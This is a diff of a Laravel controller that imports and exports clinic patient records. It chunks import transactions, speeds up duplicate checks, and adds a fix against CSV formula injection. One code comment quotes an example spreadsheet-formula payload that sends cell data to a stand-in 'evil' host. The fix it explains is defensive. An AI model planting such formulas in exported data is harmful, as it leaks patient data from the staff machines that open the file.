@@ -11,6 +11,14 @@ use Symfony\Component\HttpFoundation\StreamedResponse;
 
 class PatientImportExportController extends Controller
 {
+    /**
+     * Rows per DB transaction during import. One transaction for the whole file
+     * held a write lock for the entire run and rolled everything back on a
+     * single failure; chunking keeps each lock short and preserves the chunks
+     * that already succeeded.
+     */
+    private const IMPORT_CHUNK_SIZE = 500;
+
     // ── Column maps per source app ────────────────────────────────────────────
     // Keys   = our Patient field
     // Values = possible column header names from that app (case-insensitive)
@@ -147,86 +155,121 @@ class PatientImportExportController extends Controller
         $rows     = $this->parseFileFromPath($fullPath, pathinfo($fullPath, PATHINFO_EXTENSION), $sessionData['source']);
 
         $skipDupes = (bool) $request->get('skip_duplicates', true);
-        $branchId     = Auth::user()->branch_id;
-        $userId       = Auth::id();
-        $imported     = 0;
-        $skipped      = 0;
+        $branchId  = Auth::user()->branch_id;
+        $userId    = Auth::id();
+        $imported  = 0;
+        $skipped   = 0;
 
-        DB::transaction(function () use ($rows, $skipDupes, $branchId, $userId, &$imported, &$skipped) {
-            $seenPatientIds = []; // track patient_ids inserted in this batch to catch file-level duplicates
+        // ── Pre-load the dedup sets ONCE ─────────────────────────────────────
+        // Previously every row fired two `exists()` queries against unindexed
+        // columns, so a 4,000-row import ran 8,000 full-table scans inside one
+        // giant transaction. Two queries up-front replace all of them.
+        $existingPhones = Patient::where('branch_id', $branchId)
+            ->whereNotNull('phone')->where('phone', '!=', '')
+            ->pluck('phone')
+            ->flip();
 
-            foreach ($rows as $row) {
-                $phone = $this->sanitizePhone($row['phone'] ?? '');
+        $existingPatientIds = Patient::where('branch_id', $branchId)
+            ->whereNotNull('patient_id')
+            ->pluck('patient_id')
+            ->flip();
 
-                // Skip duplicate patient_id within this file (e.g. Bestosys exports the same ID twice)
-                $rawPatientId = $row['patient_id'] ?? null;
-                if ($rawPatientId) {
-                    if (isset($seenPatientIds[$rawPatientId])) {
+        $seenPatientIds = [];   // source IDs already inserted in THIS file
+        $seenPhones     = [];   // phones already inserted in THIS file
+
+        $linker = app(\App\Services\Relationship\PatientRelationshipLinker::class);
+
+        // ── Import in chunks ─────────────────────────────────────────────────
+        // One transaction per chunk instead of one for the whole file: a large
+        // migration no longer holds a write lock for minutes, and a failure
+        // part-way keeps the successfully imported chunks instead of rolling
+        // the entire import back.
+        foreach (collect($rows)->chunk(self::IMPORT_CHUNK_SIZE) as $chunk) {
+            DB::transaction(function () use (
+                $chunk, $skipDupes, $branchId, $userId, $linker,
+                $existingPhones, $existingPatientIds,
+                &$seenPatientIds, &$seenPhones, &$imported, &$skipped
+            ) {
+                foreach ($chunk as $row) {
+                    $phone = $this->sanitizePhone($row['phone'] ?? '');
+
+                    // Duplicate source patient_id — within the file or already in the DB.
+                    $rawPatientId = $row['patient_id'] ?? null;
+                    if ($rawPatientId) {
+                        if (isset($seenPatientIds[$rawPatientId]) || isset($existingPatientIds[$rawPatientId])) {
+                            $skipped++;
+                            continue;
+                        }
+                        $seenPatientIds[$rawPatientId] = true;
+                    }
+
+                    // Duplicate phone — within the file or already in the DB.
+                    if ($phone && $skipDupes
+                        && (isset($existingPhones[$phone]) || isset($seenPhones[$phone]))) {
                         $skipped++;
                         continue;
                     }
-                    // Also skip if this patient_id already exists in the DB
-                    if (Patient::where('branch_id', $branchId)->where('patient_id', $rawPatientId)->exists()) {
+
+                    // Build display name
+                    if (empty($row['name']) && (!empty($row['first_name']) || !empty($row['last_name']))) {
+                        $row['name'] = trim(($row['first_name'] ?? '') . ' ' . ($row['last_name'] ?? ''));
+                    }
+
+                    // Skip empty rows
+                    if (empty($row['name']) && empty($phone)) {
                         $skipped++;
                         continue;
                     }
-                    $seenPatientIds[$rawPatientId] = true;
-                }
 
-                // Duplicate check by phone
-                if ($phone && Patient::where('branch_id', $branchId)->where('phone', $phone)->exists()) {
-                    if ($skipDupes) {
+                    // Skip summary/footer rows (e.g. Clinicia exports "Count: 4242" as last row)
+                    if (preg_match('/^(count|total|sum|grand total)\s*:/i', $row['name'] ?? '')) {
                         $skipped++;
                         continue;
                     }
+
+                    // Only filter out null — keep empty strings so NOT NULL columns don't error
+                    $data = array_filter([
+                        'patient_id'     => $row['patient_id']        ?? null, // preserve source app ID if present
+                        'name'           => $row['name']              ?? null,
+                        'first_name'     => $row['first_name']        ?? null,
+                        'last_name'      => $row['last_name']         ?? null,
+                        'alternate_phone'=> $this->sanitizePhone($row['alternate_phone'] ?? '') ?: null,
+                        'email'          => $this->sanitizeEmail($row['email'] ?? '')           ?: null,
+                        'date_of_birth'  => $this->sanitizeDate($row['date_of_birth'] ?? ''),
+                        'age_years'      => is_numeric($row['age_years'] ?? '') ? (int)$row['age_years'] : null,
+                        'gender'         => $this->sanitizeGender($row['gender'] ?? '')         ?: null,
+                        'address'        => $row['address']    ?? null,
+                        'area'           => $row['area']       ?? null,
+                        'city'           => $row['city']       ?? null,
+                        'state'          => $row['state']      ?? null,
+                        'pincode'        => $row['pincode']    ?? null,
+                        'occupation'     => $row['occupation'] ?? null,
+                        'chief_complaint'=> $row['chief_complaint'] ?? null,
+                    ], fn($v) => $v !== null);
+
+                    // Always include required / non-nullable columns
+                    $data['phone']      = $phone ?: '';
+                    $data['branch_id']  = $branchId;
+                    $data['created_by'] = $userId;
+
+                    $patient = Patient::create($data);
+
+                    // Link to the Master Relationship — exactly as the web "Add
+                    // Patient" path does via PatientService. The import used to
+                    // call Patient::create() directly and skip this, which is
+                    // how bulk-imported patients ended up with no relationship
+                    // shell (the orphan rows found in the audit).
+                    // Flag-gated + never throws; a no-op when the flag is off.
+                    $linker->link($patient);
+
+                    if ($phone) {
+                        $seenPhones[$phone] = true;
+                    }
+
+                    $imported++;
                 }
-
-                // Build display name
-                if (empty($row['name']) && (!empty($row['first_name']) || !empty($row['last_name']))) {
-                    $row['name'] = trim(($row['first_name'] ?? '') . ' ' . ($row['last_name'] ?? ''));
-                }
-
-                if (empty($row['name']) && empty($phone)) {
-                    $skipped++; // Skip empty rows
-                    continue;
-                }
-
-                // Skip summary/footer rows (e.g. Clinicia exports "Count: 4242" as last row)
-                if (preg_match('/^(count|total|sum|grand total)\s*:/i', $row['name'] ?? '')) {
-                    $skipped++;
-                    continue;
-                }
-
-                // Only filter out null — keep empty strings so NOT NULL columns don't error
-                $data = array_filter([
-                    'patient_id'     => $row['patient_id']        ?? null, // preserve source app ID if present
-                    'name'           => $row['name']              ?? null,
-                    'first_name'     => $row['first_name']        ?? null,
-                    'last_name'      => $row['last_name']         ?? null,
-                    'alternate_phone'=> $this->sanitizePhone($row['alternate_phone'] ?? '') ?: null,
-                    'email'          => $this->sanitizeEmail($row['email'] ?? '')           ?: null,
-                    'date_of_birth'  => $this->sanitizeDate($row['date_of_birth'] ?? ''),
-                    'age_years'      => is_numeric($row['age_years'] ?? '') ? (int)$row['age_years'] : null,
-                    'gender'         => $this->sanitizeGender($row['gender'] ?? '')         ?: null,
-                    'address'        => $row['address']    ?? null,
-                    'area'           => $row['area']       ?? null,
-                    'city'           => $row['city']       ?? null,
-                    'state'          => $row['state']      ?? null,
-                    'pincode'        => $row['pincode']    ?? null,
-                    'occupation'     => $row['occupation'] ?? null,
-                    'chief_complaint'=> $row['chief_complaint'] ?? null,
-                ], fn($v) => $v !== null);
-
-                // Always include required / non-nullable columns
-                $data['phone']      = $phone ?: '';
-                $data['branch_id']  = $branchId;
-                $data['created_by'] = $userId;
-
-                Patient::create($data);
-
-                $imported++;
-            }
-        });
+            });
+        }
 
         // Clean up temp file and session
         \Illuminate\Support\Facades\Storage::disk('local')->delete($sessionData['temp_path']);
@@ -272,7 +315,7 @@ class PatientImportExportController extends Controller
             ]);
 
             foreach ($patients as $p) {
-                fputcsv($handle, [
+                fputcsv($handle, array_map([$this, 'csvSafe'], [
                     $p->patient_id,
                     $p->name,
                     $p->first_name,
@@ -293,7 +336,7 @@ class PatientImportExportController extends Controller
                     $p->membership_status,
                     $p->last_visit_date?->format('d/m/Y'),
                     $p->created_at->format('d/m/Y'),
-                ]);
+                ]));
             }
 
             fclose($handle);
@@ -410,6 +453,24 @@ class PatientImportExportController extends Controller
                 if ($patientIds) $q->orWhereIn('patient_id', $patientIds);
             })
             ->count();
+    }
+
+    /**
+     * Neutralise CSV formula injection.
+     *
+     * A cell beginning with = + - @ (or a leading tab/CR) is executed as a
+     * formula when the exported file is opened in Excel/Sheets. A patient whose
+     * name is `=HYPERLINK("http://evil/?"&A1,"Click")` would otherwise run on
+     * the staff machine that opens the export. Prefixing with an apostrophe
+     * forces the cell to be treated as text.
+     */
+    private function csvSafe(mixed $value): mixed
+    {
+        if (! is_string($value) || $value === '') {
+            return $value;
+        }
+
+        return preg_match('/^[=+\-@\t\r]/', $value) ? "'" . $value : $value;
     }
 
     private function sanitizePhone(string $v): string
